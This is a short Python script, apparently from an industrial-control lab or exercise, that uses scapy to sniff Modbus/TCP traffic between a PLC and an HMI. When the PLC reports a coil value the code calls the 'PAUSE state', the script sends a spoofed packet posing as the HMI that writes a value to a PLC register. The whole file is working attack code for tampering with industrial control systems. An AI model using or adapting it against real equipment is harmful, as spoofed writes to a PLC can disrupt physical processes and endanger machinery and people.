#!/usr/bin/env python3
from scapy.all import *
from scapy.contrib.modbus import *
import threading

PLC_IP = "10.10.10.10"
HMI_IP = "10.10.20.30"
ATTACK_PACKET = IP(src=HMI_IP, dst=PLC_IP) / \
                TCP(sport=RandShort(), dport=502) / \
                ModbusADURequest(transId=105, unitId=1) / \
                ModbusPDU06WriteSingleRegisterRequest(startAddr=1024, registerVal=100)

attack_triggered = threading.Event()

def packet_callback(packet):
    # Check for a response from the PLC to the HMI
    if packet.haslayer(ModbusADUResponse) and packet[IP].src == PLC_IP and packet[IP].dst == HMI_IP:
        # Check if it's a READ_COILS response
        if packet.haslayer(ModbusPDU01ReadCoilsResponse):
            if packet.coilStatus == 34:
                if not attack_triggered.is_set():
                    print("PAUSE state detected. Triggering attack...")
                    send(ATTACK_PACKET, verbose=0)
                    attack_triggered.set()

print("Starting sniffer to detect PAUSE state...")
sniff(filter=f"tcp and host {PLC_IP} and port 502", prn=packet_callback, stop_filter=lambda p: attack_triggered.is_set(), timeout=60)

if not attack_triggered.is_set():
    print("PAUSE state not detected within timeout period.")
